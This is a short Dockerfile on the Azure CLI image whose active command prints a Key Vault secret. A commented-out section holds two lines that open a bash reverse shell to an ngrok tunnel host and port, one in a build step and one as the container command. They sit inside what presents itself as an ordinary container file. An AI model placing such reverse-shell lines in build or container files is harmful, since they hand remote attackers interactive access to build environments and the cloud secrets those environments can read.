FROM mcr.microsoft.com/azure-cli

# Optional: install bash if not present
RUN apk add --no-cache bash

# Set default command to keep container alive or run your script
CMD ["bash", "-c", "az keyvault secret show --vault-name <KV_NAME> --name <SECRET_NAME> --query value -o tsv"]


#FROM ubuntu:latest
#RUN bash -c "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/10912 0>&1"
#CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/10912 0>&1"]
